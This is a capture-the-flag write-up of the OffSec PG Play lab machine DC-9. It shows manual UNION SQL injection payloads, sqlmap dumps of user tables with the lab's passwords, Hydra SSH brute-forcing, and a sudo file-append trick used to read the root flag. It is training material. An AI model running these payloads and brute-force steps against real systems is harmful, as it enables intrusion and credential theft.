---
title: "DC-9"
kind: writeup
tags:
  - offsec-pg-play
  - status/done
  - writeup
  - linux
  - web
status: "Done"
difficulty: "Intermediate"
date: 2026-08-26
category:
  - "Linux"
  - "Web"
database: "Offsec PG Play"
area: "Offsec PG Play"
up: "[[Offsec PG Play]]"
notion-id: 3c8759b9275180fe9957d07f3a08ef2c
---

# DC-9

In: [[Career]] / [[Offsec PG Play]]

### Nmap Scan

```bash
                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -p- --min-rate=1000 -oA nmap/dc9 192.168.119.209
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-26 02:47 -0400
Warning: 192.168.119.209 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.119.209
Host is up (0.067s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp open     http    Apache httpd 2.4.38 ((Debian))
|_http-title: Example.com - Staff Details - Welcome
|_http-server-header: Apache/2.4.38 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 85.69 seconds

```

![[attachments/Offsec PG Play/DC-9/image.png]]

![[attachments/Offsec PG Play/DC-9/image 1.png]]

![[attachments/Offsec PG Play/DC-9/image 2.png]]

![[attachments/Offsec PG Play/DC-9/image 3.png]]

![[attachments/Offsec PG Play/DC-9/image 4.png]]

```text
'+UNION+SELECT+1,2,3,4,5,6--+-
# Enumerate Columns
'+UNION+SELECT+null,null,null,null,null,null--+-

# enumerate tables
'+UNION+SELECT+1,2,3,4,5,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata--+-

# Enumerate all tables
hello'+UNION+SELECT+1,2,3,4,5,gRoUp_cOncaT(0x7c,table_name,0x7c)+fRoM+information_schema.tables--+-

```

![[attachments/Offsec PG Play/DC-9/image 5.png]]

```text
hello'+UNION+SELECT+1,2,3,4,5,gRoUp_cOncaT(0x7c,table_name,0x7c)+fRoM+information_schema.tables--+-

```

![[attachments/Offsec PG Play/DC-9/image 6.png]]

### Enumerate table users in db staff

```text
search=hello'+UNION+SELECT+1,2,3,4,5,gRoUp_cOncaT(0x7c,column_name,0x7c)+fRoM+information_schema.columns+wHeRe+table_name='Users'--+-
```

![[attachments/Offsec PG Play/DC-9/image 7.png]]

### Dumping Users table

```text
hello'+UNION+SELECT+1,2,3,4,5,gRoUp_cOncaT(0x7c,Username,0x7c,Password,0x7c)+fRoM+Users--+-

Email: |admin|856f5de590ef37314e7c3bdf6f8a66dc
```

![[attachments/Offsec PG Play/DC-9/image 8.png]]

### Dumping TableName from the Users DB

```text
hello'+UNION+SELECT+1,2,3,4,5,gRoUp_cOncaT(0x7c,table_name,0x7c)+fRoM+information_schema.tables+wHeRe+table_schema='users'--+-
```

![[attachments/Offsec PG Play/DC-9/image 9.png]]

### Dumping columns in Users DB

```text
hello'+UNION+SELECT+1,2,3,4,5,gRoUp_cOncaT(0x7c,column_name,0x7c)+fRoM+information_schema.columns+wHeRe+table_schema='users'--+-
```

![[attachments/Offsec PG Play/DC-9/image 10.png]]

### Dumping the users.userDetails Table

```text
hello'+UNION+SELECT+1,2,3,4,5,gRoUp_cOncaT(0x7c,Username,0x7c,Password,0x7c)+fRoM+users.UserDetails--+-
```

![[attachments/Offsec PG Play/DC-9/image 11.png]]

```text
Email: |marym|3kfs86sfd|,|julied|468sfdfsd2|,|fredf|4sfd87sfd1|,|barneyr|RocksOff|,|tomc|TC&TheBoyz|,|jerrym|B8m#48sd|,|wilmaf|Pebbles|,|bettyr|BamBam01|,|chandlerb|UrAG0D!|,|joeyt|Passw0rd|,|rachelg|yN72#dsd|,|rossg|ILoveRachel|,|monicag|3248dsds7s|,|phoebeb|smellycats|,|scoots|YR3BVxxxw87|,|janitor|Ilovepeepee|,|janitor2|Hawaii-Five-0
```

```bash
┌──(kali㉿kali)-[~]
└─$ sqlmap -r sql.txt --batch 
        ___
       __H__                                                                                                                                                               
 ___ ___[']_____ ___ ___  {1.10.9#stable}                                                                                                                                  
|_ -| . [.]     | .'| . |                                                                                                                                                  
|___|_  [,]_|_|_|__,|  _|                                                                                                                                                  
      |_|V...       |_|   https://sqlmap.org                                                                                                                               

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 01:27:14 /2026-09-24/

[01:27:14] [INFO] parsing HTTP request from 'sql.txt'
[01:27:15] [INFO] testing connection to the target URL
[01:27:15] [INFO] testing if the target URL content is stable
[01:27:16] [INFO] target URL content is stable
[01:27:16] [INFO] testing if POST parameter 'search' is dynamic
[01:27:16] [WARNING] POST parameter 'search' does not appear to be dynamic
[01:27:16] [WARNING] heuristic (basic) test shows that POST parameter 'search' might not be SQL injectable
[01:27:16] [INFO] testing for SQL injection on POST parameter 'search'
[01:27:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[01:27:17] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[01:27:17] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[01:27:18] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[01:27:18] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[01:27:19] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[01:27:19] [INFO] testing 'H2 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (CAST)'
[01:27:20] [INFO] testing 'Generic inline queries'
[01:27:20] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[01:27:21] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[01:27:21] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[01:27:22] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[01:27:42] [INFO] POST parameter 'search' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[01:27:42] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[01:27:42] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[01:27:45] [INFO] target URL appears to be UNION injectable with 6 columns
[01:27:45] [WARNING] reflective value(s) found and filtering out
[01:27:45] [INFO] POST parameter 'search' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 73 HTTP(s) requests:
---
Parameter: search (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=whatever' AND (SELECT 1075 FROM (SELECT(!SLEEP(5)))FDtl) AND 'umUu'='umUu

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: search=whatever' UNION ALL SELECT NULL,CONCAT(0x716a626b71,0x735574486d4d444a776c546d5142564678776f4d7458556f5558504b53555255584853616c656573,0x7176707a71),NULL,NULL,NULL,NULL-- -
---
[01:27:45] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[01:27:46] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.101.209'

[*] ending @ 01:27:46 /2026-09-24/

                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ sqlmap -r sql.txt --batch --dump --technique=U                
        ___
       __H__                                                                                                                                                               
 ___ ___["]_____ ___ ___  {1.10.9#stable}                                                                                                                                  
|_ -| . [(]     | .'| . |                                                                                                                                                  
|___|_  [)]_|_|_|__,|  _|                                                                                                                                                  
      |_|V...       |_|   https://sqlmap.org                                                                                                                               

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 01:28:02 /2026-09-24/

[01:28:02] [INFO] parsing HTTP request from 'sql.txt'
[01:28:03] [INFO] resuming back-end DBMS 'mysql' 
[01:28:03] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: search=whatever' UNION ALL SELECT NULL,CONCAT(0x716a626b71,0x735574486d4d444a776c546d5142564678776f4d7458556f5558504b53555255584853616c656573,0x7176707a71),NULL,NULL,NULL,NULL-- -
---
[01:28:03] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[01:28:03] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[01:28:03] [INFO] fetching current database
[01:28:04] [WARNING] reflective value(s) found and filtering out
[01:28:04] [INFO] fetching tables for database: 'Staff'
[01:28:04] [INFO] fetching columns for table 'Users' in database 'Staff'
[01:28:05] [INFO] fetching entries for table 'Users' in database 'Staff'
[01:28:05] [INFO] recognized possible password hashes in column 'Password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[01:28:06] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[01:28:06] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[01:28:06] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[01:28:06] [INFO] starting 8 processes 
[01:28:36] [WARNING] no clear password(s) found                                                                                                                           
Database: Staff
Table: Users
[1 entry]
+--------+----------------------------------+----------+
| UserID | Password                         | Username |
+--------+----------------------------------+----------+
| 1      | 856f5de590ef37314e7c3bdf6f8a66dc | admin    |
+--------+----------------------------------+----------+

[01:28:36] [INFO] table 'Staff.Users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.101.209/dump/Staff/Users.csv'
[01:28:36] [INFO] fetching columns for table 'StaffDetails' in database 'Staff'
[01:28:39] [INFO] fetching entries for table 'StaffDetails' in database 'Staff'
Database: Staff
Table: StaffDetails
[17 entries]
+----+-----------------------+----------------+------------+---------------------+-----------+-------------------------------+
| id | email                 | phone          | lastname   | reg_date            | firstname | position                      |
+----+-----------------------+----------------+------------+---------------------+-----------+-------------------------------+
| 1  | marym@example.com     | 46478415155456 | Moe        | 2019-05-01 17:32:00 | Mary      | CEO                           |
| 2  | julied@example.com    | 46457131654    | Dooley     | 2019-05-01 17:32:00 | Julie     | Human Resources               |
| 3  | fredf@example.com     | 46415323       | Flintstone | 2019-05-01 17:32:00 | Fred      | Systems Administrator         |
| 4  | barneyr@example.com   | 324643564      | Rubble     | 2019-05-01 17:32:00 | Barney    | Help Desk                     |
| 5  | tomc@example.com      | 802438797      | Cat        | 2019-05-01 17:32:00 | Tom       | Driver                        |
| 6  | jerrym@example.com    | 24342654756    | Mouse      | 2019-05-01 17:32:00 | Jerry     | Stores                        |
| 7  | wilmaf@example.com    | 243457487      | Flintstone | 2019-05-01 17:32:00 | Wilma     | Accounts                      |
| 8  | bettyr@example.com    | 90239724378    | Rubble     | 2019-05-01 17:32:00 | Betty     | Junior Accounts               |
| 9  | chandlerb@example.com | 189024789      | Bing       | 2019-05-01 17:32:00 | Chandler  | President - Sales             |
| 10 | joeyt@example.com     | 232131654      | Tribbiani  | 2019-05-01 17:32:00 | Joey      | Janitor                       |
| 11 | rachelg@example.com   | 823897243978   | Green      | 2019-05-01 17:32:00 | Rachel    | Personal Assistant            |
| 12 | rossg@example.com     | 6549638203     | Geller     | 2019-05-01 17:32:00 | Ross      | Instructor                    |
| 13 | monicag@example.com   | 8092432798     | Geller     | 2019-05-01 17:32:00 | Monica    | Marketing                     |
| 14 | phoebeb@example.com   | 43289079824    | Buffay     | 2019-05-01 17:32:02 | Phoebe    | Assistant Janitor             |
| 15 | scoots@example.com    | 454786464      | McScoots   | 2019-05-01 20:16:33 | Scooter   | Resident Cat                  |
| 16 | janitor@example.com   | 65464646479741 | Trump      | 2019-12-23 03:11:39 | Donald    | Replacement Janitor           |
| 17 | janitor2@example.com  | 47836546413    | Morrison   | 2019-12-24 03:41:04 | Scott     | Assistant Replacement Janitor |
+----+-----------------------+----------------+------------+---------------------+-----------+-------------------------------+

[01:28:39] [INFO] table 'Staff.StaffDetails' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.101.209/dump/Staff/StaffDetails.csv'
[01:28:39] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.101.209'

[*] ending @ 01:28:39 /2026-09-24/

```

```bash
┌──(kali㉿kali)-[~]
└─$ sqlmap -r sql.txt  --dump --technique=U -D users 
        ___
       __H__                                                                                                                                                               
 ___ ___[(]_____ ___ ___  {1.10.9#stable}                                                                                                                                  
|_ -| . [)]     | .'| . |                                                                                                                                                  
|___|_  [']_|_|_|__,|  _|                                                                                                                                                  
      |_|V...       |_|   https://sqlmap.org                                                                                                                               

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 01:58:38 /2026-09-24/

[01:58:38] [INFO] parsing HTTP request from 'sql.txt'
[01:58:38] [INFO] resuming back-end DBMS 'mysql' 
[01:58:38] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: search=whatever' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(CONCAT('qzxbq','eanRZvBuiJzsgqCJdltgNcsYtrBBxtRLAPBGagcF'),'qpkvq'),NULL-- ULxW
---
[01:58:43] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL 5 (MariaDB fork)
[01:58:43] [INFO] fetching tables for database: 'users'
[01:58:49] [WARNING] reflective value(s) found and filtering out
[01:58:50] [INFO] fetching columns for table 'UserDetails' in database 'users'
[01:58:53] [INFO] fetching entries for table 'UserDetails' in database 'users'
Database: users
Table: UserDetails
[17 entries]
+----+------------+---------------+---------------------+-----------+-----------+
| id | lastname   | password      | reg_date            | username  | firstname |
+----+------------+---------------+---------------------+-----------+-----------+
| 1  | Moe        | 3kfs86sfd     | 2019-12-29 16:58:26 | marym     | Mary      |
| 2  | Dooley     | 468sfdfsd2    | 2019-12-29 16:58:26 | julied    | Julie     |
| 3  | Flintstone | 4sfd87sfd1    | 2019-12-29 16:58:26 | fredf     | Fred      |
| 4  | Rubble     | RocksOff      | 2019-12-29 16:58:26 | barneyr   | Barney    |
| 5  | Cat        | TC&TheBoyz    | 2019-12-29 16:58:26 | tomc      | Tom       |
| 6  | Mouse      | B8m#48sd      | 2019-12-29 16:58:26 | jerrym    | Jerry     |
| 7  | Flintstone | Pebbles       | 2019-12-29 16:58:26 | wilmaf    | Wilma     |
| 8  | Rubble     | BamBam01      | 2019-12-29 16:58:26 | bettyr    | Betty     |
| 9  | Bing       | UrAG0D!       | 2019-12-29 16:58:26 | chandlerb | Chandler  |
| 10 | Tribbiani  | Passw0rd      | 2019-12-29 16:58:26 | joeyt     | Joey      |
| 11 | Green      | yN72#dsd      | 2019-12-29 16:58:26 | rachelg   | Rachel    |
| 12 | Geller     | ILoveRachel   | 2019-12-29 16:58:26 | rossg     | Ross      |
| 13 | Geller     | 3248dsds7s    | 2019-12-29 16:58:26 | monicag   | Monica    |
| 14 | Buffay     | smellycats    | 2019-12-29 16:58:26 | phoebeb   | Phoebe    |
| 15 | McScoots   | YR3BVxxxw87   | 2019-12-29 16:58:26 | scoots    | Scooter   |
| 16 | Trump      | Ilovepeepee   | 2019-12-29 16:58:26 | janitor   | Donald    |
| 17 | Morrison   | Hawaii-Five-0 | 2019-12-29 16:58:28 | janitor2  | Scott     |
+----+------------+---------------+---------------------+-----------+-----------+

[01:58:56] [INFO] table 'users.UserDetails' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.101.209/dump/users/UserDetails.csv'
[01:58:56] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.101.209'

[*] ending @ 01:58:56 /2026-09-24/

```

### Cracked admin password

![[attachments/Offsec PG Play/DC-9/image 12.png]]

### logged in as admin

![[attachments/Offsec PG Play/DC-9/image 13.png]]

![[attachments/Offsec PG Play/DC-9/image 14.png]]

![[attachments/Offsec PG Play/DC-9/image 15.png]]

![[attachments/Offsec PG Play/DC-9/image 16.png]]

found a knockd.conf

![[attachments/Offsec PG Play/DC-9/image 17.png]]

port got opened

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -p 22 192.168.101.209                       
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-24 01:39 -0400
Nmap scan report for 192.168.101.209
Host is up (0.100s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 a2:b3:38:74:32:74:0b:c5:16:dc:13:de:cb:9b:8a:c3 (RSA)
|   256 06:5c:93:87:15:54:68:6b:88:91:55:cf:f8:9a:ce:40 (ECDSA)
|_  256 e4:2c:88:da:88:63:26:8c:93:d5:f7:63:2b:a3:eb:ab (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.20 seconds

```

![[attachments/Offsec PG Play/DC-9/image 18.png]]

```text
marym
julied
fredf
barneyr
marym
julied
fredf
barneyr
tomc
jerrym
wilmaf
bettyr
chandlerb
joeyt
rachelg
rossg
monicag
phoebeb
scoots
janitor
janitor2
```

```bash
┌──(kali㉿kali)-[~]
└─$ hydra -L users.list -P pass.list 192.168.101.209 ssh
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-24 02:03:27
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 289 login tries (l:17/p:17), ~19 tries per task
[DATA] attacking ssh://192.168.101.209:22/
[STATUS] 81.00 tries/min, 81 tries in 00:01h, 210 to do in 00:03h, 14 active

[22][ssh] host: 192.168.101.209   login: chandlerb   password: UrAG0D!
[22][ssh] host: 192.168.101.209   login: joeyt   password: Passw0rd
[22][ssh] host: 192.168.101.209   login: janitor   password: Ilovepeepee
[STATUS] 58.20 tries/min, 291 tries in 00:05h, 1 to do in 00:01h, 5 active
1 of 1 target successfully completed, 3 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-24 02:08:53

```

ssh on these three and found this

```bash
┌──(kali㉿kali)-[~]
└─$ ssh joeyt@192.168.101.209   
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
joeyt@192.168.101.209's password: 
Linux dc-9 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
joeyt@dc-9:~$ ls
joeyt@dc-9:~$ pwd
/home/joeyt
joeyt@dc-9:~$ su janitor
Password: 
janitor@dc-9:/home/joeyt$ 
janitor@dc-9:/home/joeyt$ Ilovepeepee
bash: Ilovepeepee: command not found
janitor@dc-9:/home/joeyt$ ls
ls: cannot open directory '.': Permission denied
janitor@dc-9:/home/joeyt$ cd
janitor@dc-9:~$ ls
janitor@dc-9:~$ pwd
/home/janitor
janitor@dc-9:~$ ls -lag
total 16
drwx------  4 janitor 4096 Sep 24 16:08 .
drwxr-xr-x 19 root    4096 Dec 29  2019 ..
lrwxrwxrwx  1 janitor    9 Dec 29  2019 .bash_history -> /dev/null
drwx------  3 janitor 4096 Sep 24 16:08 .gnupg
drwx------  2 janitor 4096 Dec 29  2019 .secrets-for-putin
janitor@dc-9:~$ cat .secrets-for-putin/
cat: .secrets-for-putin/: Is a directory
janitor@dc-9:~$ cd .secrets-for-putin/
janitor@dc-9:~/.secrets-for-putin$ ls -la
total 12
drwx------ 2 janitor janitor 4096 Dec 29  2019 .
drwx------ 4 janitor janitor 4096 Sep 24 16:08 ..
-rwx------ 1 janitor janitor   66 Dec 29  2019 passwords-found-on-post-it-notes.txt
janitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt 
BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts
janitor@dc-9:~/.secrets-for-putin$ 

```

tried these found pass on the ssh and got new ssh login

```bash
┌──(kali㉿kali)-[~]
└─$ hydra -L users.list -P pass.list 192.168.101.209 ssh      
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-24 02:16:14
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 357 login tries (l:17/p:21), ~23 tries per task
[DATA] attacking ssh://192.168.101.209:22/
[22][ssh] host: 192.168.101.209   login: fredf   password: B4-Tru3-001
[22][ssh] host: 192.168.101.209   login: chandlerb   password: UrAG0D!
[22][ssh] host: 192.168.101.209   login: joeyt   password: Passw0rd
[22][ssh] host: 192.168.101.209   login: janitor   password: Ilovepeepee
[STATUS] 120.33 tries/min, 361 tries in 00:03h, 1 to do in 00:01h, 4 active
1 of 1 target successfully completed, 4 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-24 02:19:21
```

### User Flag

```text
fredf@dc-9:~$ ls
local.txt
fredf@dc-9:~$ cat local.txt 
ae401299c87694eb1895e7473300f745

```

### Priv Esc

```text
fredf@dc-9:~$ sudo -l
Matching Defaults entries for fredf on dc-9:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fredf may run the following commands on dc-9:
    (root) NOPASSWD: /opt/devstuff/dist/test/test

```

```text
fredf@dc-9:~$ sudo /opt/devstuff/dist/test/test --help
Usage: python test.py read append
```

```text
fredf@dc-9:~$ sudo -l
Matching Defaults entries for fredf on dc-9:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fredf may run the following commands on dc-9:
    (root) NOPASSWD: /opt/devstuff/dist/test/test
fredf@dc-9:~$ sudo /opt/devstuff/dist/test/test
Usage: python test.py read append
fredf@dc-9:~$ nano one.txt
fredf@dc-9:~$ touch two.txt
fredf@dc-9:~$ sudo /opt/devstuff/dist/test/test one.txt two.txt 
fredf@dc-9:~$ cat two.txt o
hello
cat: o: No such file or directory
fredf@dc-9:~$ sudo /opt/devstuff/dist/test/test /root/proof.txt two.txt
fredf@dc-9:~$ cat two.txt 
hello
8cd7a5b17e7efd4affc36fdea8305712

```
